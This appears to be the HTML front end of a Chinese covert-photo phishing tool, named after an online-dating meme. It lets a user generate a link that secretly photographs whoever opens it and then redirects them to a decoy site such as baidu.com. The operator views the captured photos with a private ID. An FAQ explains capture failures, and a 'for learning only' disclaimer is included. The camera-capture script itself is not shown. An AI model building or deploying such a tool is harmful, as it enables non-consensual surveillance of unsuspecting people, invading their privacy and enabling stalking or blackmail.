<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>网恋翻车之乔碧萝你别跑！！</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="container">
        <h1>网恋翻车之乔碧萝你别跑！！</h1>
        
        <div class="warning-box">
            <p><strong>⚠️ 警告：</strong>本工具仅做学习交流使用，请勿用于非法用途！后果自负！</p>
        </div>
        
        <div class="info-box">
            <p>1. 懒得做数据库，ID是查看照片的凭证，不要泄露给知道这个平台的人</p>
            <p>2. 为节省服务器资源，不定期删除7天前的数据</p>
        </div>
        
        <div class="form-section">
            <div class="input-group">
                <label for="myid">输入ID：</label>
                <input type="text" id="myid" placeholder="请输入唯一标识ID">
            </div>
            
            <div class="input-group">
                <label for="url">拍摄后跳转到：</label>
                <input type="text" id="url" value="http://baidu.com" placeholder="请输入跳转网址">
            </div>
            
            <div class="button-group">
                <button id="generateBtn" class="btn-primary">生成链接</button>
                <button id="checkBtn" class="btn-secondary">查看照片</button>
            </div>
        </div>
        
        <div class="result-section">
            <h3>生成的链接：</h3>
            <div class="link-display">
                <p id="generatedLink">请先生成链接！</p>
                <button id="copyBtn" class="btn-copy" style="display: none;">复制链接</button>
            </div>
        </div>
        
        <div class="faq-section">
            <h3>常见问题解答：</h3>
            <div class="faq-item">
                <p><strong>问题一：</strong>为什么拍摄的是黑屏？</p>
                <p>答：因为该浏览器不支持，更换浏览器即可，安卓用户建议直接在QQ内打开链接</p>
            </div>
            <div class="faq-item">
                <p><strong>问题二：</strong>拍摄的照片不全？</p>
                <p>答：还没等跳转完成就关闭了页面，数据还没传输完成</p>
            </div>
        </div>
    </div>
    
    <div id="photoViewer" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>照片查看器</h2>
            <div id="photoContainer">
                <p>加载中...</p>
            </div>
            <div class="modal-actions">
                <button id="prevBtn" class="btn-nav">上一页</button>
                <button id="nextBtn" class="btn-nav">下一页</button>
                <button id="clearBtn" class="btn-danger">清空照片</button>
            </div>
        </div>
    </div>
    
    <script src="js/main.js"></script>
</body>
</html>
